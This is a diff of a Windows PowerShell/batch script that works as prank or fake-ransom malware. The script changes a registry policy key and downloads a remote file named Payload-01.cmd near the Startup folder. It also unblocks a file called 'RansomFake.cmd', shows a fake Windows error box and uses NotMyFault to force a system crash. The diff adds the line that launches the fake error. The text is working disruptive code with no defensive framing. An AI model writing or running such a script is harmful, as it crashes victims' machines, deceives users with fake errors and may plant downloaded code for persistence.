@@ -15,32 +15,15 @@ reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Sy
 Cd "%UserProfile%\appdata\roaming\Microsoft\Windows\Start Menu\Programs"
 mkdir "Startup"
 invoke-webrequest -Uri "https://release-assets.githubusercontent.com/github-production-release-asset/1048403850/d393ccc5-9372-4946-9b82-8dd1e63efffd?sp=r&sv=2018-11-09&sr=b&spr=https&se=2025-09-20T19%3A46%3A20Z&rscd=attachment%3B+filename%3DPayload-01.cmd&rsct=application%2Foctet-stream&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2025-09-20T18%3A46%3A00Z&ske=2025-09-20T19%3A46%3A20Z&sks=b&skv=2018-11-09&sig=VrTgr7%2BGZAd%2BTGX%2FBQRimbWUww90cpBefeYpJkMw7KU%3D&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc1ODM5NTcxMCwibmJmIjoxNzU4Mzk1NDEwLCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ._tipdiKegtCWXgN8xIgLD0uSAshb0Jzg35MRmWJ0txE&response-content-disposition=attachment%3B%20filename%3DPayload-01.cmd&response-content-type=application%2Foctet-stream"
-invoke-webrequest -Uri "https://download.sysinternals.com/files/NotMyFault.zip" -OutFile "$env:temp"
+invoke-webrequest -Uri "https://download.sysinternals.com/files/NotMyFault.zip" -OutFile "$home\AppData\Local\Temp\NotMyFault.zip"
 Unblock-File "RansomFake.cmd"
 Expand-Archive -Path "$home\AppData\Local\Temp\NotMyFault.zip" -DestinationPath "$home\AppData\Local\temp\B10HT6R3NO"
 cd "$home\AppData\Local\Temp"
 echo "msgbox "Error 1S65HF5TY", 16+2+4096 , "Windows need to restart"" > nwork.vbs
 unblock-file "nwork.vbs"
+start nwork.vbs
 cd "$home\AppData\Local\Temp\B10HT6R3NO"
 NotMyFault.exe /crash
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 
 
